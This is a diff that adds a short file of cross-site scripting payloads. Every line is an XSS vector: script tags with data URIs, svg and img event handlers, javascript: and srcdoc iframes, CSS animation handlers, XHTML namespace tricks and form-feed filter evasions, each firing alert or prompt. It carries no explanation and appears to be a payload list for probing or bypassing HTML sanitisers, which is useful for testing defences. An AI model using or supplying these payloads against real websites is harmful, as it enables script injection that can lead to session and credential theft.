@@ -1,0 +1,16 @@
+<script src=data:&comma;alert(1)//></script>
+<svg/onload=alert(45)>
+<img src=z onerror=alert(45)>
+<iframe src=“javascript:alert(45)”></iframe>
+<svg </onload ="1> (_=prompt,_(45)) "">
+<script/"<a"/src=data:=".<a,[45].some(alert)></script>
+
+<style>@keyframes x{}</style>
+<div style="animation-name:x" onanimationstart="alert('45')"></div>
+
+<html:html xmlns:html=‘http://www.w3.org/1999/xhtml’><html:script>alert('XSS')</html:script></html:html>
+
+<svg^Lonload=alert(45)>
+<!— ^L is x0c —>
+
+<iframe src="" srcdoc="<script>alert(45)</script>"></iframe>
